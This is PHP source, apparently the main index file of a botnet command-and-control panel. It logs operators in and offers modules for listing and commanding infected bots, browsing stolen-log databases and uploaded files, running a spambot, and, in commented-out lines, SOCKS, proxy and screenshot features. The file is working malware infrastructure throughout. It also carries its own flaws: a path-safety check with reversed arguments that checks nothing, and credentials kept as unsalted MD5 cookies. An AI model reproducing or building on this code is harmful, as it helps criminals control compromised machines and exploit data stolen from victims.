<? include_once('system/global.php');
if(!@__CheckHostURL('in.php'))die();
define('__INDEX__',1);
define('QUERY_STRING_BLANK', $_SERVER['PHP_SELF'].'?m=');

//Опции куков
session_set_cookie_params(COOKIE_LIVETIME, SCRIPT_ROOT);
session_name('CC');
session_start();

if(!@include_once(FILE_CONFIG))die('Hello!');

//Language
if(isset($_POST['lng']))$_SESSION['lng'] = $_POST['lng'];
else if(isset($_GET['lng']))$_SESSION['lng'] = $_GET['lng'];
else if(isset($_COOKIE['lng']))$_SESSION['lng'] = $_COOKIE['lng'];
if(!isset($_SESSION['lng']) || !SafePath($_SESSION['lng']) || !file_exists('system/'.$_SESSION['lng'].'.lng.php'))$_SESSION['lng'] = LNG_DEF;
include_once('system/'.$_SESSION['lng'].'.lng.php'); 
if(!isset($_COOKIE['lng']) || $_SESSION['lng'] !== $_COOKIE['lng'])setcookie('lng', $_SESSION['lng'], COOKIE_LIVETIME, SCRIPT_ROOT);

//Database
if(!@mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS) || !@mysql_select_db(MYSQL_DB))die(mysql_error());

//Login
if(isset($_GET['m']))
{
  //Login
  if($_GET['m'] == 'login' && isset($_POST['l']) && isset($_POST['p']))
  {
    if(isset($_POST['rmb']) && $_POST['rmb'] == 1)
    {
      setcookie('cl', md5($_POST['l']), COOKIE_LIVETIME, SCRIPT_ROOT);
      setcookie('cp', md5($_POST['p']), COOKIE_LIVETIME,SCRIPT_ROOT);
    }
    $_SESSION['login'] = $_POST['l'];
    $_SESSION['pass']  = md5($_POST['p']);
    Header('Location: '.QUERY_STRING_BLANK.'home');
    die();
  }
  //Logout
  else if($_GET['m'] == 'logout')ClearSession();
}

function SafePath($str)
{
  return(strstr("/",$str) == FALSE && strstr("\\", $str) == FALSE && strstr("\0", $str) == FALSE);
}

function PathCombine($p1, $p2)
{

}

function PathFix($p)
{

}

function ClearSession()
{
  unset($_SESSION['login']);
  unset($_SESSION['pass']);
  unset($_SESSION['id']);
  unset($_COOKIE['cl']);
  unset($_COOKIE['cp']);
  setcookie('cl', '', COOKIE_LIVETIME, SCRIPT_ROOT);
  setcookie('cp', '', COOKIE_LIVETIME, SCRIPT_ROOT);
}

function GetUserData($names)
{
  if(($r = mysql_query('SELECT '.$names.' FROM '.TABLE_USERS." WHERE id='".addslashes($_SESSION['id'])."' LIMIT 1")) &&
     mysql_affected_rows() == 1 && ($m = mysql_fetch_row($r)))return $m;
  return FALSE;
}

function ShowError($mask)
{
  global $module;
  if(isset($_SESSION['errors'][$module]) && $_SESSION['errors'][$module] > 0 && defined($mask.$_SESSION['errors'][$module]))
  {
    print '<center><font class="error">'.constant($mask.$_SESSION['errors'][$module]).'</font></center><br>';
    $_SESSION['errors'][$module] = 0;
  }
}

function ShowOK($mask)
{
  global $module;
  if(isset($_SESSION['oks'][$module]) && $_SESSION['oks'][$module] > 0 && defined($mask.$_SESSION['oks'][$module]))
  {
    print '<center><font class="ok">'.constant($mask.$_SESSION['oks'][$module]).'</font></center><br>';
    $_SESSION['oks'][$module] = 0;
  }
}

function SetError($id)
{
  global $module;
  $_SESSION['errors'][$module] = $id;
}

function SetOK($id)
{
  global $module;
  $_SESSION['oks'][$module] = $id;
}

function mask2sql($mask)
{
  return str_replace(array('%', '_', '*', '#'), array('\%', '\_','%','_'), $mask);
}

function vlt($cid)
{
  return MODULES & MODULE_LOGS_DB && PRIV & PRIV_LOGS_DB ?
         '<a href="'.QUERY_STRING_BLANK.'dblogs&cids='.urlencode($cid).'&today" target="_blank" class="ca">'.htmlentities($cid).'</a>' :
         '<b>'.htmlentities($cid).'</b>';
}

function int2ver($i)
{
  return sprintf("%u.%u.%u.%u", ($i >> 24) & 0xFF, ($i >> 16) & 0xFF,($i >> 8) & 0xFF, $i & 0xFF);
}

//Check login
$error = 1; //no logged
if(isset($_SESSION['login']) && isset($_SESSION['pass']))
{
  $error = (($r=mysql_query('SELECT id, priv, login, pass FROM '.TABLE_USERS." WHERE login='".addslashes($_SESSION['login'])."' AND pass='".addslashes($_SESSION['pass'])."' LIMIT 1")) && mysql_affected_rows() == 1) ? 0 : 2;
}
if($error !=0 && isset($_COOKIE['cl']) && $_COOKIE['cl'] != '' && isset($_COOKIE['cp']) && $_COOKIE['cp'] != '')
{
  $error = (($r = mysql_query('SELECT id,priv,login,pass FROM '.TABLE_USERS." WHERE MD5(login)='".addslashes($_COOKIE['cl'])."' AND pass='".addslashes($_COOKIE['cp'])."' LIMIT 1")) && mysql_affected_rows() == 1) ? 0 : 2;
}
if($error != 0)
{
  $module='login';
  ClearSession();
}
else 
{
  //Define user data
  $m = mysql_fetch_row($r);
  $_SESSION['id']    = $m[0];
  $_SESSION['login'] = $m[2];
  $_SESSION['pass']  = $m[3];
  define('PRIV', $m[1]);
  
  //Формирование меню
  $MND = array(0,         LNG_MM_STATS,       PRIV_STATS,                            0,
               'stats',   LNG_MM_STATS_INFO,  PRIV_STATS,                            0,
               0,         LNG_MM_BOTNET,      PRIV_BOTS | PRIV_BOTS_CMDS,            MODULE_BOTS | MODULE_BOTS_CMDS,
               'bots',    LNG_MM_BOTNET_LIST, PRIV_BOTS,                             MODULE_BOTS,
               'bcmds',   LNG_MM_BOTNET_CMDS, PRIV_BOTS_CMDS,                        MODULE_BOTS_CMDS,
               0,         LNG_MM_LOGS,        PRIV_LOGS_DB | PRIV_LOGS_DBT,          MODULE_LOGS_DB,
               'dblogs',  LNG_MM_LOGS_DB,     PRIV_LOGS_DB,                          MODULE_LOGS_DB,
               'dbtlogs', LNG_MM_LOGS_DBT,    PRIV_LOGS_DBT,                         MODULE_LOGS_DB | MODULE_LOGS_TMPS,
               'lfiles' , LNG_MM_LOGS_FILES,  PRIV_LOGS_FILES,                       MODULE_LOGS | MODULE_LOGS_FILES,
               'spam'   , LNG_MM_SPAMBOT,     PRIV_SPAMBOT,                          MODULE_SPAMBOT,
               0,         LNG_MM_SYS,         PRIV_USERS | PRIV_OPTIONS | PRIV_USER, MODULE_LOGS | MODULE_BOTS | MODULE_USERS,
               'users',   LNG_MM_SYS_USERS,   PRIV_USERS,                            MODULE_USERS,
               'user',    LNG_MM_SYS_USER,    PRIV_USER,                             0,
               'options', LNG_MM_SYS_OPTIONS, PRIV_OPTIONS,                          MODULE_LOGS | MODULE_BOTS
               );
  $MNC = count($MND);
  $needm = isset($_GET['m']) ? $_GET['m'] : '';
  $module = '';
  for($i = 0; $i < $MNC; $i += 4)if($MND[$i] !== 0 && PRIV & $MND[$i + 2] && ($MND[$i + 3] == 0 || MODULES & $MND[$i + 3]))
  {
    if($needm === $MND[$i])
    {
      $module = $MND[$i];
      break;
    }
    if($module == '')$module = $MND[$i];
  }
  if($module == '')
  {
    $module = 'login';
    ClearSession();
  }
  define('MODULE', $module);
        //print 'href="&output='.OUTPUT_TEXT.'" class="ca">'.htmlentities($m[1]).'</a></td>';

  //Формирование меню CompID
  $m = array();
  if(MODULES & MODULE_LOGS_DB && PRIV & LNG_MM_LOGS_DB)
  {
    $m[] = '[\''.LNG_CM_VL_TEXT.'\',\''.QUERY_STRING_BLANK.'dblogs&today&str=&compids=$0$&output=1\']';
    $m[] = '[\''.LNG_CM_VL_HTML.'\',\''.QUERY_STRING_BLANK.'dblogs&today&str=&compids=$0$&output=0\']';
  }
  if(MODULES & LNG_MM_LOGS_FILES  && PRIV & PRIV_LOGS_FILES)$m[] = '[\''.LNG_CM_UF   .'\',\''.QUERY_STRING_BLANK.'\']';
  //                                                          $m[] = '[\''.LNG_CM_INFO .'\',\''.QUERY_STRING_BLANK.'\']';
  //if(MODULES & LNG_MM_BOTNET_CMDS && PRIV & PRIV_BOTS_CMDS) $m[] = '[\''.LNG_CM_RCMD .'\',\''.QUERY_STRING_BLANK.'\']';
  //if(MODULES & MODULE_BOTS_LC_SS  && PRIV & PRIV_BOTS_LC_SS)$m[] = '[\''.LNG_CM_SS   .'\',\''.QUERY_STRING_BLANK.'\']';
  //if(MODULES & MODULE_BOTS_SOCKS  && PRIV & PRIV_BOTS_SOCKS)$m[] = '[\''.LNG_CM_SOCK .'\',\''.QUERY_STRING_BLANK.'\']';
  //if(MODULES & MODULE_BOTS_PROXY  && PRIV & PRIV_BOTS_PROXY)$m[] = '[\''.LNG_CM_PROXY.'\',\''.QUERY_STRING_BLANK.'\']';
  define('CID_POPUPMENU', implode(',', $m));
}

//Загрузка модуля
if(!file_exists('system/'.$_SESSION['lng'].'.'.$module.'.lng.php'))$_SESSION['lng'] = LNG_DEF;
define('QUERY_STRING', QUERY_STRING_BLANK.$module);
include_once('theme/html.php');
include_once('system/'.$_SESSION['lng'].'.'.$module.'.lng.php');
include_once('system/mod.'.$module.'.php'); 
?>